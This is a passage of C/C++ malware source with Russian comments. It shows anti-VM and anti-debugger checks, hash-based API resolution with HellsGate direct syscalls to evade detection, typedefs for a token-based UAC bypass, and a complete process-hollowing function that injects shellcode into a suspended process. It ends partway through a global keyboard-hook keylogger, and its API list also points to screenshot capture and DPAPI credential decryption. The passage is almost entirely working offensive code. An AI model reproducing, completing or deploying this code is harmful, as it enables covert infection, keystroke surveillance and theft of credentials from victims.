        strcmp(hypervisorName, "VBoxVBoxVBox") == 0 ||
        strcmp(hypervisorName, "XenVMMXenVMM") == 0 ||
        strcmp(hypervisorName, "Microsoft Hv") == 0 || // Может быть   раньше
        strcmp(hypervisorName, "Hyper-V") == 0) { // Некоторые версии могут так отвечать
         printf("[Anti-VM] Hypervisor detected via CPUID leaf 0x40000000: %s\n", hypervisorName);
         isVM = TRUE;
         return TRUE;
    }


    // Дополнительно: Проверка имени компьютера/пользователя (менее надежно)
    // char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    // DWORD computerNameSize = sizeof(computerName);
    // if (GetComputerNameA(computerName, &computerNameSize)) {
    //     CharUpperA(computerName);
    //     if (strstr(computerName, "SANDBOX") || strstr(computerName, "MALTEST") || strstr(computerName, "VM")) {
    //          printf("[Anti-VM] Suspicious computer name: %s\n", computerName);
    //          isVM = TRUE; // Может быть ложным срабатыванием
    //          // return TRUE; // Не выходим сразу, возможно
    //     }
    // }

    printf("[Anti-VM] No definitive VM indicators found by basic checks.\n");
    return isVM;
}

// --- Функция для проверки наличия отладчика ---
BOOL IsDebuggerPresentDetected() {
    BOOL isDebugging = FALSE;
    ObfuscatedString msg1 = OBFUSCATED("[Anti-Debug] IsDebuggerPresent() returned TRUE.\n");
    ObfuscatedString msg2 = OBFUSCATED("[Anti-Debug] CheckRemoteDebuggerPresent() detected a remote debugger.\n");
    ObfuscatedString msg3 = OBFUSCATED("[Anti-Debug] PEB->BeingDebugged flag is set.\n");
    ObfuscatedString msg4 = OBFUSCATED("[Anti-Debug] No debugger detected by basic checks.\n");

    // 1. Простая проверка через IsDebuggerPresent() (читает флаг в PEB)
    if (IsDebuggerPresent()) {
        char* deob_msg1 = deobfuscate(msg1.data, msg1.length);
        if (deob_msg1) { printf(deob_msg1); free(deob_msg1); }
        isDebugging = TRUE;
        return TRUE; // Если нашли, сразу выходим
    }

    // 2. Проверка на удаленный отладчик
    BOOL isRemoteDebuggerPresent = FALSE;
    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent) && isRemoteDebuggerPresent) {
        char* deob_msg2 = deobfuscate(msg2.data, msg2.length);
         if (deob_msg2) { printf(deob_msg2); free(deob_msg2); }
        isDebugging = TRUE;
        return TRUE; // Если нашли, сразу выходим
    }

    // 3. Проверка флага BeingDebugged в PEB вручную (альтернатива IsDebuggerPresent)
    //    Это может обойти некоторые хуки на IsDebuggerPresent
#ifdef _WIN64
    PEB* pPeb = (PEB*)__readgsqword(0x60); // Получаем PEB для 64-бит
#else
    PEB* pPeb = (PEB*)__readfsdword(0x30); // Получаем PEB для 32-бит
#endif
    if (pPeb->BeingDebugged) {
         char* deob_msg3 = deobfuscate(msg3.data, msg3.length);
         if (deob_msg3) { printf(deob_msg3); free(deob_msg3); }
         isDebugging = TRUE;
         return TRUE;
    }

    // TODO: Добавить более продвинутые техники (например, проверка времени выполнения, аппаратные точки останова)

    char* deob_msg4 = deobfuscate(msg4.data, msg4.length);
    if (deob_msg4) { printf(deob_msg4); free(deob_msg4); }
    return isDebugging;
}

// --- Типы указателей на функции WinAPI для скрытия импортов и UAC Bypass ---
// Уже есть:
typedef BOOL (WINAPI *Type_CreateProcessA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

// Новые для UAC Bypass:
typedef HANDLE (WINAPI *Type_OpenProcess)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
);

typedef BOOL (WINAPI *Type_OpenProcessToken)(
    HANDLE ProcessHandle,
    DWORD DesiredAccess,
    PHANDLE TokenHandle
);

typedef BOOL (WINAPI *Type_DuplicateTokenEx)(
    HANDLE hExistingToken,
    DWORD dwDesiredAccess,
    LPSECURITY_ATTRIBUTES lpTokenAttributes,
    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
    TOKEN_TYPE TokenType,
    PHANDLE phNewToken
);

typedef BOOL (WINAPI *Type_CreateProcessWithTokenW)(
    HANDLE hToken,
    DWORD dwLogonFlags, // LOGON_WITH_PROFILE or 0
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef BOOL (WINAPI *Type_LookupPrivilegeValueW)(
    LPCWSTR lpSystemName,
    LPCWSTR lpName,
    PLUID lpLuid
);

typedef BOOL (WINAPI *Type_AdjustTokenPrivileges)(
    HANDLE TokenHandle,
    BOOL DisableAllPrivileges,
    PTOKEN_PRIVILEGES NewState,
    DWORD BufferLength,
    PTOKEN_PRIVILEGES PreviousState,
    PDWORD ReturnLength
);

// --- Глобальные указатели на функции ---
// Уже есть:
Type_CreateProcessA ptrCreateProcessA = NULL;

// Новые:
Type_OpenProcess ptrOpenProcess = NULL;
Type_OpenProcessToken ptrOpenProcessToken = NULL;
Type_DuplicateTokenEx ptrDuplicateTokenEx = NULL;
Type_CreateProcessWithTokenW ptrCreateProcessWithTokenW = NULL;
Type_LookupPrivilegeValueW ptrLookupPrivilegeValueW = NULL;
Type_AdjustTokenPrivileges ptrAdjustTokenPrivileges = NULL;

// Новые для Keylogger:
typedef LRESULT (CALLBACK *Type_LowLevelKeyboardProc)(
    int nCode,
    WPARAM wParam,
    LPARAM lParam
);

typedef HHOOK (WINAPI *Type_SetWindowsHookExW)(
    int idHook,
    HOOKPROC lpfn,
    HINSTANCE hMod, // Должен быть HINSTANCE DLL
    DWORD dwThreadId // 0 для глобального хука
);

typedef BOOL (WINAPI *Type_UnhookWindowsHookEx)(
    HHOOK hhk
);

typedef LRESULT (WINAPI *Type_CallNextHookEx)(
    HHOOK hhk,
    int nCode,
    WPARAM wParam,
    LPARAM lParam
);

typedef SHORT (WINAPI *Type_GetAsyncKeyState)(
    int vKey
);

// Функции для цикла сообщений (могут быть уже в kernel32/user32)
typedef BOOL (WINAPI *Type_GetMessageW)(
    LPMSG lpMsg,
    HWND hWnd,
    UINT wMsgFilterMin,
    UINT wMsgFilterMax
);

typedef BOOL (WINAPI *Type_TranslateMessage)(
    const MSG *lpMsg
);

typedef LRESULT (WINAPI *Type_DispatchMessageW)(
    const MSG *lpMsg
);

// --- Глобальные переменные для кейлоггера ---
HHOOK g_hKeyboardHook = NULL;
std::vector<std::string> g_keyBuffer; // Простой буфер для логов
std::mutex g_bufferMutex;           // Мьютекс для защиты буфера
BOOL g_keyloggerRunning = FALSE;
HANDLE g_messageLoopThread = NULL;

// --- Функция для получения адресов нужных функций --- 
BOOL InitializeApiPointers() {
    if (g_apiPointersInitialized) {
        return TRUE;
    }
    printf("[InitApi] Initializing API pointers (using HellsGate and hashing)...\n");
    
    // Инициализируем HellsGate ПЕРЕД получением других указателей
    if (!InitializeHellsGate()) {
        printf("[InitApi] CRITICAL: Failed to initialize HellsGate. Direct Syscalls unavailable.\n");
        // return FALSE; // Можно сделать инициализацию HellsGate обязательной
    }

    // Получаем хендлы модулей через наш GetModuleBaseByHash
    HMODULE hKernel32 = GetModuleBaseByHash(KERNEL32DLL_HASH);
    HMODULE hUser32 = GetModuleBaseByHash(0x4A3A8AC); // djb2("user32.dll")
    HMODULE hGdi32 = GetModuleBaseByHash(0x8F0EBD79); // djb2("gdi32.dll")
    HMODULE hCrypt32 = GetModuleBaseByHash(0x4B67439F); // djb2("crypt32.dll")
    HMODULE hShell32 = GetModuleBaseByHash(0xFD4D66C); // djb2("shell32.dll")
    HMODULE hOle32 = GetModuleBaseByHash(0x36F5780E); // djb2("ole32.dll")
    HMODULE hGdiplus = GetModuleBaseByHash(0x3AD3242F); // djb2("gdiplus.dll")
    HMODULE hIphlpapi = GetModuleBaseByHash(0x28413F4E); // djb2("iphlpapi.dll")

    if (!hKernel32) { 
        printf("[InitApi] Failed to get Kernel32 handle! Cannot continue.\n"); 
        return FALSE; 
    }
     printf("[InitApi] Kernel32 handle: %p\n", hKernel32);
     // Проверка остальных хендлов опциональна, если функции из них не критичны
     if (!hUser32) printf("[InitApi] Warning: User32 handle not found.\n");
     if (!hGdi32) printf("[InitApi] Warning: Gdi32 handle not found.\n");
     if (!hCrypt32) printf("[InitApi] Warning: Crypt32 handle not found.\n");
     if (!hShell32) printf("[InitApi] Warning: Shell32 handle not found.\n");
     if (!hOle32) printf("[InitApi] Warning: Ole32 handle not found.\n");
     if (!hGdiplus) printf("[InitApi] Warning: Gdiplus handle not found.\n");
     if (!hIphlpapi) printf("[InitApi] Warning: Iphlpapi handle not found.\n");

    // --- Получаем остальные указатели через GetProcAddressByHash ---
    printf("[InitApi] Resolving remaining API pointers by hash...\n");

    // Kernel32 functions
    g_api.ptrVirtualAllocEx = (VirtualAllocEx_t)GetProcAddressByHash(hKernel32, 0xE92E1A07); // djb2("VirtualAllocEx")
    g_api.ptrWriteProcessMemory = (WriteProcessMemory_t)GetProcAddressByHash(hKernel32, 0xC614D7C5); // djb2("WriteProcessMemory")
    g_api.ptrGetThreadContext = (GetThreadContext_t)GetProcAddressByHash(hKernel32, 0xC5C84903); // djb2("GetThreadContext")
    g_api.ptrSetThreadContext = (SetThreadContext_t)GetProcAddressByHash(hKernel32, 0x61A8007A); // djb2("SetThreadContext")
    g_api.ptrResumeThread = (ResumeThread_t)GetProcAddressByHash(hKernel32, 0x583C6A); // djb2("ResumeThread")
    g_api.ptrTerminateProcess = (TerminateProcess_t)GetProcAddressByHash(hKernel32, 0x1D87A386); // djb2("TerminateProcess")
    g_api.ptrCloseHandle = (CloseHandle_t)GetProcAddressByHash(hKernel32, 0x53020668); // djb2("CloseHandle")
    g_api.ptrVirtualFreeEx = (VirtualFreeEx_t)GetProcAddressByHash(hKernel32, 0x70747228); // djb2("VirtualFreeEx")
    g_api.ptrGetLastError = (GetLastError_t)GetProcAddressByHash(hKernel32, 0x6744577E); // djb2("GetLastError")
    g_api.ptrFormatMessageA = (FormatMessageA_t)GetProcAddressByHash(hKernel32, 0xB7A8F44C); // djb2("FormatMessageA")
    g_api.ptrLocalFree = (LocalFree_t)GetProcAddressByHash(hKernel32, 0xE1AF653); // djb2("LocalFree")
    g_api.ptrGetProcessHeap = (GetProcessHeap_t)GetProcAddressByHash(hKernel32, 0x6483B61F); // djb2("GetProcessHeap")
    g_api.ptrHeapAlloc = (HeapAlloc_t)GetProcAddressByHash(hKernel32, 0x69DA1CA); // djb2("HeapAlloc")
    g_api.ptrHeapFree = (HeapFree_t)GetProcAddressByHash(hKernel32, 0x4E1EB492); // djb2("HeapFree")
    g_api.ptrGetFileAttributesA = (GetFileAttributesA_t)GetProcAddressByHash(hKernel32, 0x4A46004F); // djb2("GetFileAttributesA")
    g_api.ptrIsDebuggerPresent = (IsDebuggerPresent_t)GetProcAddressByHash(hKernel32, 0x316B65CB); // djb2("IsDebuggerPresent")
    g_api.ptrCheckRemoteDebuggerPresent = (CheckRemoteDebuggerPresent_t)GetProcAddressByHash(hKernel32, 0x31ED8748); // djb2("CheckRemoteDebuggerPresent")
    g_api.ptrGetCurrentProcess = (GetCurrentProcess_t)GetProcAddressByHash(hKernel32, 0x5B4BCF0F); // djb2("GetCurrentProcess")
    g_api.ptrWideCharToMultiByte = (WideCharToMultiByte_t)GetProcAddressByHash(hKernel32, 0xBF97A7E2); // djb2("WideCharToMultiByte")
    g_api.ptrMultiByteToWideChar = (MultiByteToWideChar_t)GetProcAddressByHash(hKernel32, 0x386A6085); // djb2("MultiByteToWideChar")
    g_api.ptrSleep = (Sleep_t)GetProcAddressByHash(hKernel32, 0x7F8AF90E); // djb2("Sleep")
    g_api.ptrCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t)GetProcAddressByHash(hKernel32, 0x8B13218A); // djb2("CreateToolhelp32Snapshot")
    g_api.ptrProcess32First = (Process32First_t)GetProcAddressByHash(hKernel32, 0x9E5C1F8F); // djb2("Process32First")
    g_api.ptrProcess32Next = (Process32Next_t)GetProcAddressByHash(hKernel32, 0x8B45A773); // djb2("Process32Next")
    g_api.ptrGetComputerNameA = (GetComputerNameA_t)GetProcAddressByHash(hKernel32, 0xB0D51A3E); // djb2("GetComputerNameA")
    g_api.ptrRegOpenKeyExA = (RegOpenKeyExA_t)GetProcAddressByHash(hKernel32, 0xC36BE54); // djb2("RegOpenKeyExA") - Note: Advapi32.dll usually!
    g_api.ptrRegEnumValueA = (RegEnumValueA_t)GetProcAddressByHash(hKernel32, 0xBA31C608); // djb2("RegEnumValueA") - Note: Advapi32.dll usually!
    g_api.ptrRegCloseKey = (RegCloseKey_t)GetProcAddressByHash(hKernel32, 0x3B0B4F03); // djb2("RegCloseKey") - Note: Advapi32.dll usually!

    // Advapi32 functions (Registry functions are typically here)
    HMODULE hAdvapi32 = GetModuleBaseByHash(0x45F7CAB4); // djb2("advapi32.dll")
    if(hAdvapi32){
        g_api.ptrRegOpenKeyExA = (RegOpenKeyExA_t)GetProcAddressByHash(hAdvapi32, 0xC36BE54); // djb2("RegOpenKeyExA")
        g_api.ptrRegEnumValueA = (RegEnumValueA_t)GetProcAddressByHash(hAdvapi32, 0xBA31C608); // djb2("RegEnumValueA")
        g_api.ptrRegCloseKey = (RegCloseKey_t)GetProcAddressByHash(hAdvapi32, 0x3B0B4F03); // djb2("RegCloseKey")
         g_api.ptrRegSetValueExW = (RegSetValueExW_t)GetProcAddressByHash(hAdvapi32, 0x65045A3); // djb2("RegSetValueExW")
         g_api.ptrRegCreateKeyExW = (RegCreateKeyExW_t)GetProcAddressByHash(hAdvapi32, 0x43F95A26); // djb2("RegCreateKeyExW")
    } else {
        printf("[InitApi] Warning: Advapi32 handle not found. Registry functions might fail.\n");
        // Fallback to kernel32 attempt already done, pointers might be null.
    }

    // Iphlpapi function
    if (hIphlpapi) {
        g_api.ptrGetAdaptersInfo = (GetAdaptersInfo_t)GetProcAddressByHash(hIphlpapi, 0x738AF865); // djb2("GetAdaptersInfo")
    } // else: warning already printed

    // User32 functions (Keylogger, Screenshot)
    if (hUser32) {
        g_api.ptrSetWindowsHookExW = (SetWindowsHookExW_t)GetProcAddressByHash(hUser32, 0xBC12F40); // djb2("SetWindowsHookExW")
        g_api.ptrUnhookWindowsHookEx = (UnhookWindowsHookEx_t)GetProcAddressByHash(hUser32, 0xB78C766F); // djb2("UnhookWindowsHookEx")
        g_api.ptrCallNextHookEx = (CallNextHookEx_t)GetProcAddressByHash(hUser32, 0x23289BFE); // djb2("CallNextHookEx")
        g_api.ptrGetAsyncKeyState = (GetAsyncKeyState_t)GetProcAddressByHash(hUser32, 0x677907C); // djb2("GetAsyncKeyState")
        g_api.ptrGetMessageW = (GetMessageW_t)GetProcAddressByHash(hUser32, 0xE3059C64); // djb2("GetMessageW")
        g_api.ptrTranslateMessage = (TranslateMessage_t)GetProcAddressByHash(hUser32, 0x48F390C1); // djb2("TranslateMessage")
        g_api.ptrDispatchMessageW = (DispatchMessageW_t)GetProcAddressByHash(hUser32, 0x3EE64C45); // djb2("DispatchMessageW")
        g_api.ptrToUnicode = (ToUnicode_t)GetProcAddressByHash(hUser32, 0x3B47084); // djb2("ToUnicode")
        g_api.ptrGetKeyboardState = (GetKeyboardState_t)GetProcAddressByHash(hUser32, 0xE39B08E4); // djb2("GetKeyboardState")
        g_api.ptrGetDC = (GetDC_t)GetProcAddressByHash(hUser32, 0x5BD7B858); // djb2("GetDC")
        g_api.ptrReleaseDC = (ReleaseDC_t)GetProcAddressByHash(hUser32, 0x19B4DDC); // djb2("ReleaseDC")
    } // else: warning already printed

    // Gdi32 functions (Screenshot)
    if (hGdi32) {
        g_api.ptrCreateCompatibleDC = (CreateCompatibleDC_t)GetProcAddressByHash(hGdi32, 0xA7B85D10); // djb2("CreateCompatibleDC")
        g_api.ptrGetDeviceCaps = (GetDeviceCaps_t)GetProcAddressByHash(hGdi32, 0xF880A40); // djb2("GetDeviceCaps")
        g_api.ptrCreateCompatibleBitmap = (CreateCompatibleBitmap_t)GetProcAddressByHash(hGdi32, 0x618F1F5B); // djb2("CreateCompatibleBitmap")
        g_api.ptrSelectObject = (SelectObject_t)GetProcAddressByHash(hGdi32, 0x486E3C6); // djb2("SelectObject")
        g_api.ptrBitBlt = (BitBlt_t)GetProcAddressByHash(hGdi32, 0x21E2A70); // djb2("BitBlt")
        g_api.ptrDeleteDC = (DeleteDC_t)GetProcAddressByHash(hGdi32, 0x397E1A66); // djb2("DeleteDC")
        g_api.ptrDeleteObject = (DeleteObject_t)GetProcAddressByHash(hGdi32, 0x1E028BD); // djb2("DeleteObject")
        g_api.ptrGetDIBits = (GetDIBits_t)GetProcAddressByHash(hGdi32, 0x81AF754B); // djb2("GetDIBits")
    } // else: warning already printed

    // Crypt32 functions (Screenshot, DPAPI)
    if (hCrypt32) {
        g_api.ptrCryptBinaryToStringA = (CryptBinaryToStringA_t)GetProcAddressByHash(hCrypt32, 0x29438F5F); // djb2("CryptBinaryToStringA")
        g_api.ptrCryptUnprotectData = (CryptUnprotectData_t)GetProcAddressByHash(hCrypt32, 0x8093815B); // djb2("CryptUnprotectData")
    } // else: warning already printed

    // Shell32 functions (DPAPI)
    if (hShell32) {
        g_api.ptrSHGetFolderPathW = (SHGetFolderPathW_t)GetProcAddressByHash(hShell32, 0xE6C4464F); // djb2("SHGetFolderPathW")
    } // else: warning already printed

    // GDI+ and OLE pointers (JPEG Screenshot, COM)
    if (hGdiplus) {
        g_api.ptrGdiplusStartup = (GdiplusStartup_t)GetProcAddressByHash(hGdiplus, 0x8708C3C0); // djb2("GdiplusStartup")
        g_api.ptrGdiplusShutdown = (GdiplusShutdown_t)GetProcAddressByHash(hGdiplus, 0x438FD70); // djb2("GdiplusShutdown")
        g_api.ptrGdipCreateBitmapFromHBITMAP = (GdipCreateBitmapFromHBITMAP_t)GetProcAddressByHash(hGdiplus, 0xD7004B73); // djb2("GdipCreateBitmapFromHBITMAP")
        g_api.ptrGdipSaveImageToStream = (GdipSaveImageToStream_t)GetProcAddressByHash(hGdiplus, 0x97B72314); // djb2("GdipSaveImageToStream")
        g_api.ptrGdipDisposeImage = (GdipDisposeImage_t)GetProcAddressByHash(hGdiplus, 0xE4AE1684); // djb2("GdipDisposeImage")
        g_api.ptrGdipGetImageEncodersSize = (GdipGetImageEncodersSize_t)GetProcAddressByHash(hGdiplus, 0x1075A0A8); // djb2("GdipGetImageEncodersSize")
        g_api.ptrGdipGetImageEncoders = (GdipGetImageEncoders_t)GetProcAddressByHash(hGdiplus, 0xCD9346); // djb2("GdipGetImageEncoders")
    } // else: warning already printed
    if (hOle32) {
        g_api.ptrCreateStreamOnHGlobal = (CreateStreamOnHGlobal_t)GetProcAddressByHash(hOle32, 0xEA1796B6); // djb2("CreateStreamOnHGlobal")
        g_api.ptrGetHGlobalFromStream = (GetHGlobalFromStream_t)GetProcAddressByHash(hOle32, 0xCA08568); // djb2("GetHGlobalFromStream")
        g_api.ptrCoInitializeEx = (CoInitializeEx_t)GetProcAddressByHash(hOle32, 0x1C2DA595); // djb2("CoInitializeEx")
        g_api.ptrCoCreateInstance = (CoCreateInstance_t)GetProcAddressByHash(hOle32, 0x1F85965A); // djb2("CoCreateInstance")
        g_api.ptrCoUninitialize = (CoUninitialize_t)GetProcAddressByHash(hOle32, 0x97A36AD2); // djb2("CoUninitialize")
    } // else: warning already printed

    // Проверка критически важных указателей (пример)
    if (!g_api.ptrVirtualAllocEx || !g_api.ptrWriteProcessMemory || !g_api.ptrCloseHandle || !g_api.ptrGetLastError) {
        printf("[InitApi] Failed to resolve one or more essential Kernel32 functions by hash!\n");
        return FALSE; // Считаем это фатальной ошибкой
    }

    g_apiPointersInitialized = TRUE;
    printf("[InitApi] API pointer resolution attempt finished.\n");
    return TRUE;
}

// --- Реализация основной функции инъекции ---
EXPORT_FUNC int inject_process_hollowing(
    LPCSTR targetProcessPath, 
    const unsigned char* shellcode, 
    DWORD shellcodeSize,
    char** errorMsg) 
{
    *errorMsg = NULL; 
    printf("[Injector] Attempting Process Hollowing: target='%s', shellcodeSize=%lu\n", targetProcessPath, shellcodeSize);

    // Инициализируем указатели на API функции
    if (!InitializeApiPointers()) {
        ObfuscatedString err = OBFUSCATED("Failed to initialize API pointers for Process Hollowing.");
        *errorMsg = deobfuscate(err.data, err.length);
        return 3001; // Custom error code
    }

    if (!targetProcessPath || !shellcode || shellcodeSize == 0) {
        const char* msg = "Invalid parameters provided.";
        *errorMsg = (char*)malloc(strlen(msg) + 1);
        if (*errorMsg) strcpy(*errorMsg, msg);
        return 1; 
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;

    LPVOID remoteMem = NULL;
    BOOL success = FALSE;
    DWORD lastError = 0;

    // 1. Создаем целевой процесс в приостановленном состоянии, используя указатель
    printf("[Injector] Creating suspended process: %s\n", targetProcessPath);
    success = ptrCreateProcessA( // Вызов через указатель
        NULL,                  // No module name (use command line)
        (LPSTR)targetProcessPath, // Command line
        NULL,                  // Process handle not inheritable
        NULL,                  // Thread handle not inheritable
        FALSE,                 // Set handle inheritance to FALSE
        CREATE_SUSPENDED,      // Create the process in a suspended state
        NULL,                  // Use parent's environment block
        NULL,                  // Use parent's starting directory 
        &si,                   // Pointer to STARTUPINFO structure
        &pi                    // Pointer to PROCESS_INFORMATION structure
    );

    if (!success) {
        lastError = GetLastError();
        printf("[Injector] Failed to create process. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        return lastError;
    }
    printf("[Injector] Process created successfully (PID: %lu, TID: %lu)\n", pi.dwProcessId, pi.dwThreadId);

    // --- Получаем ImageBaseAddress и вызываем NtUnmapViewOfSection через Direct Syscall ---
    printf("[Injector] Attempting to unmap original image using Direct Syscall...\n");
    PROCESS_BASIC_INFORMATION pbi = {0};
    ULONG returnLength = 0;
    NTSTATUS status = DirectSyscall_NtQueryInformationProcess(
        pi.hProcess,
        0, // ProcessBasicInformation class
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (status >= 0 && returnLength == sizeof(pbi) && pbi.PebBaseAddress) {
        printf("[Injector] Got PEB address: %p\n", pbi.PebBaseAddress);
        // Читаем ImageBaseAddress из PEB удаленного процесса
        // Оффсет ImageBaseAddress в PEB: 0x10 для x64, 0x08 для x86
#ifdef _WIN64
        PVOID imageBaseOffset = (PVOID)((BYTE*)pbi.PebBaseAddress + 0x10);
#else
        PVOID imageBaseOffset = (PVOID)((BYTE*)pbi.PebBaseAddress + 0x08);
#endif
        PVOID remoteImageBase = NULL;
        SIZE_T bytesRead = 0;
        if (ReadProcessMemory(pi.hProcess, imageBaseOffset, &remoteImageBase, sizeof(PVOID), &bytesRead) && bytesRead == sizeof(PVOID)) {
             printf("[Injector] Read ImageBaseAddress from PEB: %p\n", remoteImageBase);
             // Вызываем NtUnmapViewOfSection через Direct Syscall
            status = DirectSyscall_NtUnmapViewOfSection(pi.hProcess, remoteImageBase);
            if (status >= 0) {
                 printf("[Injector] NtUnmapViewOfSection (Direct Syscall) successful.\n");
            } else {
                printf("[Injector] NtUnmapViewOfSection (Direct Syscall) failed. Status: 0x%X\n", status);
                 // Не фатальная ошибка, можем продолжить инъекцию шеллкода
                 // Но оригинальный образ не будет выгружен
            }
        } else {
             lastError = GetLastError();
             printf("[Injector] Failed to read ImageBaseAddress from remote PEB. Error: %lu\n", lastError);
             // Не фатальная ошибка
        }
    } else {
         printf("[Injector] Failed to get ProcessBasicInformation or PEB address. Status: 0x%X\n", status);
         // Не фатальная ошибка
    }
    // --- Конец блока NtUnmapViewOfSection ---

    // 2. Выделяем память в удаленном процессе для шеллкода
    printf("[Injector] Allocating memory in remote process (size: %lu bytes)\n", shellcodeSize);
    // TODO: Рассмотреть выделение памяти под PE хедеры, если делаем полный PE injection, а не только shellcode
    remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteMem == NULL) {
        lastError = GetLastError();
        printf("[Injector] VirtualAllocEx failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        TerminateProcess(pi.hProcess, 1); // Завершаем процесс, так как инъекция не удалась
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }
    printf("[Injector] Memory allocated at address: %p\n", remoteMem);

    // 3. Записываем шеллкод в выделенную память
    printf("[Injector] Writing shellcode to remote process...\n");
    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcodeSize, NULL)) {
        lastError = GetLastError();
        printf("[Injector] WriteProcessMemory failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE); // Освобождаем выделенную память
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }
    printf("[Injector] Shellcode written successfully.\n");

    // 4. Получаем контекст основного потока
    printf("[Injector] Getting thread context...\n");
    if (!GetThreadContext(pi.hThread, &ctx)) {
        lastError = GetLastError();
        printf("[Injector] GetThreadContext failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }
    printf("[Injector] Thread context obtained.\n");

    // 5. Модифицируем точку входа (EIP/RIP) для указания на наш шеллкод
    printf("[Injector] Modifying instruction pointer (EIP/RIP)...\n");
#ifdef _M_IX86 // 32-bit
    ctx.Eip = (DWORD)remoteMem;
    printf("[Injector] New EIP: %p\n", (void*)ctx.Eip);
#elif defined(_M_AMD64) // 64-bit
    ctx.Rip = (DWORD64)remoteMem;
     printf("[Injector] New RIP: %p\n", (void*)ctx.Rip);
#else
    #error "Unsupported architecture (target should be Windows x86 or x64)"
#endif

    // 6. Устанавливаем измененный контекст потока
    printf("[Injector] Setting modified thread context...\n");
    if (!SetThreadContext(pi.hThread, &ctx)) {
        lastError = GetLastError();
        printf("[Injector] SetThreadContext failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }
    printf("[Injector] Thread context set successfully.\n");

    // 7. Возобновляем выполнение основного потока
    printf("[Injector] Resuming target thread...\n");
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        lastError = GetLastError();
        printf("[Injector] ResumeThread failed. Error code: %lu\n", lastError);
        *errorMsg = get_windows_error_message(lastError);
        // Поток уже может быть запущен с неправильным контекстом, но все равно пытаемся очистить
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return lastError;
    }

    printf("[Injector] Process Hollowing attempt finished. Thread resumed.\n");

    // Закрываем хендлы
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0; // Успех
}

// --- Реализация функции освобождения памяти ---
EXPORT_FUNC void free_error_message(char* errorMsg) {
    if (errorMsg) {
        printf("[Injector] Freeing error message memory.\n");
        free(errorMsg);
    }
}

// --- Callback функция для клавиатурного хука ---
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pkhs = (KBDLLHOOKSTRUCT *)lParam;
        
        // Интересуют только события нажатия клавиши (не отпускания)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            std::string keyString = "";
            DWORD vkCode = pkhs->vkCode;

            // Попробуем получить читаемое имя клавиши
            wchar_t keyNameBuffer[256] = {0};
            BYTE keyboardState[256] = {0}; // Получаем состояние клавиатуры
            GetKeyboardState(keyboardState);

            // Используем ToUnicode для преобразования с учетом раскладки и состояния Shift/Ctrl/Alt
            // Это лучше, чем просто маппинг VK кодов
            int result = ToUnicode(vkCode, pkhs->scanCode, keyboardState, keyNameBuffer, sizeof(keyNameBuffer)/sizeof(wchar_t), 0);
            
            if (result > 0) { // Если удалось получить символ
                 // Конвертируем wchar_t* в std::string (используем UTF-8)
                int utf8Size = WideCharToMultiByte(CP_UTF8, 0, keyNameBuffer, result, NULL, 0, NULL, NULL);
                if (utf8Size > 0) {
                    char* utf8Buffer = new char[utf8Size + 1];
                    WideCharToMultiByte(CP_UTF8, 0, keyNameBuffer, result, utf8Buffer, utf8Size, NULL, NULL);
                    utf8Buffer[utf8Size] = '\0';
                    keyString = utf8Buffer;
                    delete[] utf8Buffer;
                }
            } else { // Если не удалось (служебные клавиши, непечатаемые символы)
                 // Можно добавить обработку специфичных VK_ кодов (Shift, Ctrl, Enter, Backspace и т.д.)
                 switch (vkCode) {
                    case VK_RETURN: keyString = "[ENTER]"; break;
                    case VK_BACK:   keyString = "[BACKSPACE]"; break;
                    case VK_TAB:    keyString = "[TAB]"; break;
                    case VK_SHIFT:  /*keyString = "[SHIFT]";*/ break; // Обычно не логируем сами по себе
                    case VK_LSHIFT: /*keyString = "[LSHIFT]";*/ break;
                    case VK_RSHIFT: /*keyString = "[RSHIFT]";*/ break;
